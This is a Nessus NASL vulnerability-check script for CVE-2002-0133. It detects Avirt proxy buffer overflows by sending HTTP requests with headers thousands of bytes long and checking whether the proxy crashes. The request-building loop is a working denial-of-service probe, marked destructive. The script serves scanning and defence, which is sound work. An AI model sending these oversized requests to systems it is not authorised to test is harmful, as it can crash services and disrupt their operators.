#
# This script was written by Michel Arboi <arboi@alussinan.org>
# GPL
# *untested*
#
# Cf. RFC 1945 & RFC 2068
# 
# Vulnerables:
# Avirt SOHO v4.2
# Avirt Gateway v4.2
# Avirt Gateway Suite v4.2
# 
# References:
# Date:  Thu, 17 Jan 2002 20:23:28 +0100
# From: "Strumpf Noir Society" <vuln-dev@labs.secureance.com>
# To: bugtraq@securityfocus.com
# Subject: Avirt Proxy Buffer Overflow Vulnerabilities
# 



if(description)
{
  script_id(11715);
  script_bugtraq_id(3904, 3905);
  script_cve_id("CVE-2002-0133");
  script_version ("$Revision: 1.4 $");
  name["english"] = "Header overflow against HTTP proxy";
  script_name(english:name["english"]);
 
  desc["english"] = "It was possible to kill the HTTP proxy by
sending an invalid request with a too long header

A cracker may exploit this vulnerability to make your proxy server
crash continually or even execute arbitrary code on your system.

Solution : upgrade your software
Risk factor : High";

  script_description(english:desc["english"]);
 
  summary["english"] = "Too long HTTP header kills the HTTP proxy server";
  script_summary(english:summary["english"]);
 
  script_category(ACT_DESTRUCTIVE_ATTACK);
 
  script_copyright(english:"This script is Copyright (C) 2003 Michel Arboi");
  family["english"] = "Gain root remotely";
  family["francais"] = "Passer root à distance";
  script_family(english:family["english"], francais:family["francais"]);
  script_require_ports("Services/www", 8080);
  script_dependencie("find_service.nes", "httpver.nasl", "http_version.nasl");
  exit(0);
}

########

include("http_func.inc");

port = get_http_port(default:8080);
if ( ! port ) exit(0);
if(! get_port_state(port)) exit(0);
if (http_is_dead(port: port)) exit(0);

soc = open_sock_tcp(port);
if(! soc) exit(0);

domain = get_kb_item("Settings/third_party_domain");
if(domain)
  test_host = string("www.", domain);
 else 
  test_host = "www";
   

headers = make_list(
	string("From: ", crap(2048), "@", crap(2048), ".org"),
	string("If-Modified-Since: Sat, 29 Oct 1994 19:43:31 ", 
		crap(data: "GMT", length: 4096)),
	string("Referer: http://", crap(4096), "/"),
# Many other HTTP/1.1 headers...
	string("If-Unmodified-Since: Sat, 29 Oct 1994 19:43:31 ", 
		crap(data: "GMT", length: 2048))	);
	

r1 = string("GET http://", test_host, "/", rand(), " HTTP/1.0\r\n");

foreach h (headers)
{
  r = string(r1, h, "\r\n\r\n");
  send(socket:soc, data: r);
  r = http_recv(socket:soc);
  close(soc);
  soc = open_sock_tcp(port);
  if (! soc)  {  security_hole(port); exit(0); }
}

close(soc);

if (http_is_dead(port: port)) {  security_hole(port); exit(0); }
